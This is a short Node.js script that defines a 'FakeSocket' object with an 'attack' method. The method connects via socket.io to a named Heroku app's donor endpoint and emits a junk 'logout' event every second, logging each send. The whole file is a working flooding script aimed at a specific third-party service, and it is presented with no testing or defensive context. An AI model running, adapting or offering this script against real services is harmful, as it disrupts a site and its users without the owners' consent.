const io=require('socket.io-client');
let socket;
 function FakeSocket(host,interval){
     this.interval=interval;
     this.host=host;
    this.socket=new Promise((resolve,reject)=>resolve(io.connect(this.host)));
    this.attack=()=>{
        this.socket.then(socket=>setInterval(()=>{
            socket.emit('logout',`Random array of characters`);
            console.log(`Data sent! ${socket.id}`);
        },this.interval));
    }
}
    new FakeSocket('https://food-shary.herokuapp.com/donor',1000).attack();